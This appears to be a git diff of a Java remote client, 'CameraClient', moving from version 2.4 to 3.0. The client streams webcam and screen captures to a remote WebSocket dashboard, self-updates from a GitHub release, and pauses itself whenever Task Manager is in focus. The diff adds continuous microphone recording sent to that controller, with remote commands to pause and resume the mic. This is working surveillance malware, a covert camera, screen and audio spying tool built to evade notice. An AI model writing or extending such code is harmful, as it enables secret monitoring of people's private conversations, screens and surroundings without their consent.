@@ -16,6 +16,10 @@ import java.util.concurrent.Executors;
 import java.util.concurrent.TimeUnit;
 
 import javax.imageio.ImageIO;
+import javax.sound.sampled.AudioFormat;
+import javax.sound.sampled.AudioSystem;
+import javax.sound.sampled.DataLine;
+import javax.sound.sampled.TargetDataLine;
 
 import org.bytedeco.javacv.Frame;
 import org.bytedeco.javacv.Java2DFrameConverter;
@@ -30,7 +34,7 @@ public class CameraClient {
 
     // Self-update
     static final String UPDATE_URL = "https://github.com/reyHay/reyhancam/releases/latest/download/camera-client.jar";
-    static final String VERSION    = "2.4";
+    static final String VERSION    = "3.0";
 
     // Runtime-adjustable settings (dashboard can change these via commands)
     static volatile int     camFps        = 30;
@@ -40,12 +44,14 @@ public class CameraClient {
     static volatile int     screenWidth   = 1920;
     static volatile boolean camPaused     = false;
     static volatile boolean screenPaused  = false;
+    static volatile boolean micPaused     = false;
 
     static volatile CameraWebSocket ws;
     static volatile boolean reconnecting = false;
     static volatile boolean paused = false; // true when Task Manager is in focus
     static String pcId;
     static boolean hasCamera = false;
+    static boolean hasMic    = false;
     static OpenCVFrameGrabber grabber;
     public static void main(String[] args) throws Exception {
         checkForUpdate();
@@ -70,9 +76,14 @@ public class CameraClient {
         }
         if (!hasCamera) System.out.println("[*] Camera: false");
 
+        // Always attempt mic — loop handles failure gracefully
+        hasMic = true;
+        System.out.println("[*] Microphone: attempting...");
+
         startTaskManagerWatcher();
         if (hasCamera) startCameraLoop();
         startScreenLoop();
+        startMicLoop();
         connectAndRun();
 
         Runtime.getRuntime().addShutdownHook(new Thread(() -> {
@@ -211,15 +222,18 @@ public class CameraClient {
     static void startCameraLoop() {
         Java2DFrameConverter converter = new Java2DFrameConverter();
         Thread t = new Thread(() -> {
+            javax.imageio.ImageWriter writer = newJpegWriter();
+            javax.imageio.ImageWriteParam param = newJpegParam(writer);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream(256 * 1024);
             while (true) {
                 long start = System.currentTimeMillis();
                 try {
-                    if (!paused && !camPaused && ws != null && ws.isOpen() && shouldSend(false)) {
+                    if (!paused && !camPaused && ws != null && ws.isOpen() && shouldSend()) {
                         Frame frame = grabber.grab();
                         if (frame != null && frame.image != null) {
                             BufferedImage img = converter.convert(frame);
                             if (img != null) {
-                                String b64 = toBase64(img, camQuality);
+                                String b64 = encodeJpeg(img, camQuality, writer, param, baos);
                                 if (b64 != null) ws.send("{\"type\":\"frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
                             }
                         }
@@ -247,10 +261,13 @@ public class CameraClient {
         Rectangle screen = new Rectangle(Toolkit.getDefaultToolkit().getScreenSize());
 
         Thread t = new Thread(() -> {
+            javax.imageio.ImageWriter writer = newJpegWriter();
+            javax.imageio.ImageWriteParam param = newJpegParam(writer);
+            ByteArrayOutputStream baos = new ByteArrayOutputStream(512 * 1024);
             while (true) {
                 long start = System.currentTimeMillis();
                 try {
-                    if (!paused && !screenPaused && ws != null && ws.isOpen() && shouldSend(true)) {
+                    if (!paused && !screenPaused && ws != null && ws.isOpen() && shouldSend()) {
                         BufferedImage raw = robot.createScreenCapture(screen);
                         int sw = screenWidth;
                         int scaledH = (int) ((double) raw.getHeight() / raw.getWidth() * sw);
@@ -259,7 +276,7 @@ public class CameraClient {
                         g.setRenderingHint(java.awt.RenderingHints.KEY_INTERPOLATION, java.awt.RenderingHints.VALUE_INTERPOLATION_BILINEAR);
                         g.drawImage(raw, 0, 0, sw, scaledH, null);
                         g.dispose();
-                        String b64 = toBase64(scaled, screenQuality);
+                        String b64 = encodeJpeg(scaled, screenQuality, writer, param, baos);
                         if (b64 != null) ws.send("{\"type\":\"screen_frame\",\"id\":\"" + pcId + "\",\"frame\":\"" + b64 + "\"}");
                     }
                 } catch (Exception e) {
@@ -276,28 +293,94 @@ public class CameraClient {
         System.out.println("[*] Screen capture started");
     }
 
-    // Drop frame if WebSocket has unsent data queued — prevents backlog/delay
-    static boolean shouldSend(boolean isScreen) {
-        if (ws == null || !ws.isOpen()) return false;
-        if (ws.hasBufferedData()) return false; // connection is backed up, drop this frame
-        return true;
+    static void startMicLoop() {
+        Thread t = new Thread(() -> {
+            AudioFormat[] formats = {
+                new AudioFormat(16000, 16, 1, true, false),
+                new AudioFormat(44100, 16, 1, true, false),
+                new AudioFormat(22050, 16, 1, true, false),
+            };
+            AudioFormat chosenFmt = null;
+            for (AudioFormat f : formats) {
+                try {
+                    TargetDataLine tl = (TargetDataLine) AudioSystem.getLine(new DataLine.Info(TargetDataLine.class, f));
+                    tl.open(f);
+                    tl.close();
+                    chosenFmt = f;
+                    System.out.println("[*] Microphone: true (" + (int)f.getSampleRate() + "Hz)");
+                    break;
+                } catch (Exception ignored) {}
+            }
+            if (chosenFmt == null) {
+                System.out.println("[*] Microphone: false (no line available)");
+                hasMic = false;
+                // tell server/dashboard mic is not available
+                if (ws != null && ws.isOpen())
+                    ws.send("{\"type\":\"update_caps\",\"id\":\"" + pcId + "\",\"hasMic\":false}");
+                return;
+            }
+            final AudioFormat fmt = chosenFmt;
+            final int sampleRate = (int) fmt.getSampleRate();
+            final int chunkBytes = sampleRate / 10 * 2; // 100ms of s16 mono
+
+            while (true) {
+                try {
+                    TargetDataLine line = (TargetDataLine) AudioSystem.getLine(new DataLine.Info(TargetDataLine.class, fmt));
+                    line.open(fmt);
+                    line.start();
+                    System.out.println("[*] Microphone capture started (" + sampleRate + "Hz)");
+                    byte[] buf = new byte[chunkBytes];
+                    while (true) {
+                        int read = line.read(buf, 0, buf.length);
+                        if (read <= 0) continue;
+                        if (!paused && !micPaused && ws != null && ws.isOpen()) {
+                            String b64 = Base64.getEncoder().encodeToString(
+                                read == buf.length ? buf : java.util.Arrays.copyOf(buf, read));
+                            ws.send("{\"type\":\"audio_chunk\",\"id\":\"" + pcId + "\",\"sr\":" + sampleRate + ",\"audio\":\"" + b64 + "\"}");
+                        }
+                    }
+                } catch (Exception e) {
+                    System.err.println("[!] Mic error: " + e.getMessage());
+                    try { Thread.sleep(3000); } catch (InterruptedException ignored) {}
+                }
+            }
+        }, "MicLoop");
+        t.setDaemon(true);
+        t.start();
     }
-    static String toBase64(BufferedImage img, int quality) {
+
+    // Drop frame if WebSocket has unsent data queued — prevents backlog/delay
+    static boolean shouldSend() {
+        if (ws == null || !ws.isOpen()) return false;
+        return !ws.hasBufferedData();
+    }
+    // Reusable JPEG encoder — call only from a single thread
+    static String encodeJpeg(BufferedImage img, int quality,
+                              javax.imageio.ImageWriter writer,
+                              javax.imageio.ImageWriteParam param,
+                              ByteArrayOutputStream baos) {
         try {
-            ByteArrayOutputStream baos = new ByteArrayOutputStream();
-            javax.imageio.ImageWriter writer = ImageIO.getImageWritersByFormatName("jpg").next();
-            javax.imageio.ImageWriteParam param = writer.getDefaultWriteParam();
-            param.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
-            param.setCompressionQuality(quality / 100f);
+            baos.reset();
             javax.imageio.stream.ImageOutputStream ios = ImageIO.createImageOutputStream(baos);
             writer.setOutput(ios);
+            param.setCompressionQuality(quality / 100f);
             writer.write(null, new javax.imageio.IIOImage(img, null, null), param);
-            writer.dispose();
             ios.close();
             byte[] bytes = baos.toByteArray();
             return bytes.length == 0 ? null : Base64.getEncoder().encodeToString(bytes);
         } catch (Exception e) { return null; }
     }
+
+    static javax.imageio.ImageWriter newJpegWriter() {
+        return ImageIO.getImageWritersByFormatName("jpg").next();
+    }
+    static javax.imageio.ImageWriteParam newJpegParam(javax.imageio.ImageWriter w) {
+        javax.imageio.ImageWriteParam p = w.getDefaultWriteParam();
+        p.setCompressionMode(javax.imageio.ImageWriteParam.MODE_EXPLICIT);
+        return p;
+    }
+
+
 
 
 
@@ -308,7 +391,7 @@ public class CameraClient {
             ws.connectBlocking();
             if (!ws.isOpen()) { scheduleReconnect(); return; }
             System.out.println("[+] Connected.");
-            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + ",\"hasScreen\":true,\"version\":\"" + VERSION + "\"}");
+            ws.send("{\"type\":\"hello\",\"id\":\"" + pcId + "\",\"hasCamera\":" + hasCamera + ",\"hasScreen\":true,\"hasMic\":" + hasMic + ",\"version\":\"" + VERSION + "\"}");
         } catch (Exception e) {
             System.err.println("[!] Connection error: " + e.getMessage());
             scheduleReconnect();
@@ -340,6 +423,8 @@ public class CameraClient {
                     case "cam_resume"         -> { camPaused = false; System.out.println("[*] Camera resumed"); }
                     case "screen_pause"       -> { screenPaused = true;  System.out.println("[*] Screen paused"); }
                     case "screen_resume"      -> { screenPaused = false; System.out.println("[*] Screen resumed"); }
+                    case "mic_pause"          -> { micPaused = true;  System.out.println("[*] Mic paused"); }
+                    case "mic_resume"         -> { micPaused = false; System.out.println("[*] Mic resumed"); }
                     case "set_cam_fps"        -> { int v = extractInt(msg, "value"); if (v > 0 && v <= 60)   camFps = v; }
                     case "set_screen_fps"     -> { int v = extractInt(msg, "value"); if (v > 0 && v <= 30)   screenFps = v; }
                     case "set_cam_quality"    -> { int v = extractInt(msg, "value"); if (v >= 10 && v <= 100) camQuality = v; }
